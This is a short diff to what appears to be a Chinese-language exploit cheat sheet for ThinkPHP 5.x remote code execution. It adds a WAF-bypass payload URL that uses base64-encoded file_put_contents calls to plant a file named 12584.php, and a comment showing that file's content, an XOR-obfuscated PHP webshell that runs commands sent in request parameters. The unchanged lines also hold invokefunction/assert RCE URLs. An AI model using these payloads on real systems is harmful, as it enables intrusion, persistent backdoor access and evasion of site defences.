@@ -27,4 +27,8 @@ http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=s
 5.0.x php版本>=5.4
 http://127.0.0.1/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
 
+过狗的：
+http://127.0.0.1/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@file_put_contents(base64_decode(MTI1ODQucGhw),base64_decode(b2suPD9waHAgJHsiYHt7eyJeIj88Pi8ifVthXSgkX1BPU1RbeF0pOzs7))
+文件名：12584.php，马儿内容为：ok.<?php ${"`{{{"^"?<>/"}[a]($_POST[x]);;;
+
 
